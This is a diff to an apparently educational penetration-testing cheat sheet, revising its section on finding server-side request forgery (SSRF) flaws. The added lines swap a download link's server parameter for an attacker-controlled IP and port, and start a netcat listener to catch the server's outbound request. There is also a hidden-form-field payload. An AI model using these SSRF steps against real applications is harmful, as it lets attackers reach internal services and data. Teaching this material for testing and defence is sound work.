@@ -2671,16 +2671,22 @@ A successful SSRF attack can result in any of the following:
 
 ### Finding an SSRF
 - **Identifying Vulnerable Input:** Attackers find input fields within the application, like URL parameters in web forms or API endpoints, which can be manipulated to trigger server-side requests.
-  ```txt
-  Example: https://berkankutuk.dk/form?server=api
+  ```html
+  <a href="/download?server:8087=secure-file-storage.com&id=75482342">Download</a>
+  <!-- Replace the server IP with an attacker-controlled server -->
+  <a href="/download?10.10.116.118:1234&id=75482342">Download</a>
+  ```
+  And then wait for the server to make a request to the attacker-controlled server.
+  ```r
+  nc -lvnp 1234
   ```
 - **Manipulating the Input:** Attackers input malicious URLs or payloads to cause the application to make unintended requests, such as pointing to internal servers or external ones controlled by the attacker.
   ```html
-  Example: <input type="hidden" name="server" value="=http://server.website.com/store">
+  <input type="hidden" name="server" value="=http://server.website.com/store">
   ```
 - **Requesting Unauthorized Resources:** The application server, unaware of the malicious input, makes requests to the specified URLs or resources, potentially targeting internal or sensitive services.
   ```txt
-  Example: https://berkankutuk.dk/form?server=http://server.website.com/store
+  https://berkankutuk.dk/form?server=http://server.website.com/store
   ```
 - **Exploiting the Response:** Attackers exploit the responses from malicious requests to gather valuable information like internal server data, credentials, or pathways for further exploitation. Directory traversal and `&x=` can also be used in some cases to manipulate paths.
 
